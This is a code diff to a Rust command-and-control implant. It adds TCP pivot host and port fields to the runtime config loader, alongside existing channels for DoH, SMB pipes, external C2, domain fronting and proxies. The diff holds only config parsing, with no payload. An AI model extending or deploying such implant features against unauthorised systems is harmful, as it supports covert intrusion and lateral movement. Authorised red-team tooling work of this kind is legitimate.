@@ -188,7 +188,7 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
     // Channel dispatcher fields (spec-1). Old server-generated configs stop
     // after expires_at — `remaining()==0` → default to Https-only.
     let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token,
-         rotation_hosts, fronting_host, proxy_server) =
+         rotation_hosts, fronting_host, proxy_server, tcp_peer_host, tcp_peer_port) =
         if r.remaining() > 0 {
             let pc = r.u8().ok()?;
             let fb = r.u8().ok()?;
@@ -202,7 +202,13 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
             } else {
                 (crate::heap::String::new(), crate::heap::String::new(), crate::heap::String::new())
             };
-            (pc, fb, dr, sp, eh, et, rh, fh, ps)
+            // spec-3 raw pivot fields — further backward compat layer.
+            let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
+                (r.str().ok()?, r.u16().ok()?)
+            } else {
+                (crate::heap::String::new(), 0u16)
+            };
+            (pc, fb, dr, sp, eh, et, rh, fh, ps, tcp_peer_host, tcp_peer_port)
         } else {
             (
                 0u8,
@@ -214,6 +220,8 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
                 crate::heap::String::new(),
                 crate::heap::String::new(),
                 crate::heap::String::new(),
+                crate::heap::String::new(),
+                0u16,
             )
         };
 
@@ -234,6 +242,8 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
         rotation_hosts,
         fronting_host,
         proxy_server,
+        tcp_peer_host,
+        tcp_peer_port,
     };
 
     let implant = ImplantConfig {
